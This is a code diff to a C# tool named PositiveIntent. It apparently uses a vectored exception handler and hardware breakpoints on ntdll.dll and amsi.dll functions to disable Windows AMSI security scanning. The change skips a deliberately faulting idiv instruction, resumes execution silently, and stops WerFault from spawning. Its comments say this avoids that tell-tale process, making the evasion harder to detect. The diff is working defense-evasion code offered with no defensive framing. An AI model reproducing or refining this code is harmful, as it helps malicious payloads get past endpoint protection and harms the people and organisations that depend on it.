@@ -74,6 +74,16 @@ namespace PositiveIntent
             {
                 CONTEXT context = Marshal.PtrToStructure<CONTEXT>(exceptionInfo.ContextRecord);
 
+                // --- Advance RIP past the faulting idiv instruction ---
+                // Detect REX prefix (0x40–0x4F) for 64-bit operand size
+                byte firstByte = Marshal.ReadByte(new IntPtr((long)context.Rip));
+                bool hasRex = (firstByte & 0xF0) == 0x40;
+                context.Rip += hasRex ? 3UL : 2UL;  // REX F7 /7 = 3 bytes, F7 /7 = 2 bytes
+
+                // Leave quotient/remainder registers in a defined state
+                context.Rax = 0;
+                context.Rdx = 0;
+
                 // Get target function address
                 IntPtr ntdllBaseAddress = Generic.GetLoadedModuleAddress("ntdll.dll");
                 IntPtr amsiBaseAddress = Generic.GetLoadedModuleAddress("amsi.dll");
@@ -103,8 +113,10 @@ namespace PositiveIntent
 
                 breakpointsSet = true;
 
-                // Let the exception propagate to managed handler (will become DivideByZeroException)
-                return EXCEPTION_CONTINUE_SEARCH;
+                // Old flow: Let the exception propagate to managed handler (will become DivideByZeroException) - this triggered WerFault to spawn
+                // New flow: Handle the exception entirely in the VEH - skip the managed handler and return to the instruction after the idiv, with HWBPs set
+                //return EXCEPTION_CONTINUE_SEARCH;
+                return EXCEPTION_CONTINUE_EXECUTION;
             }
 
             // Handle hardware breakpoint hits
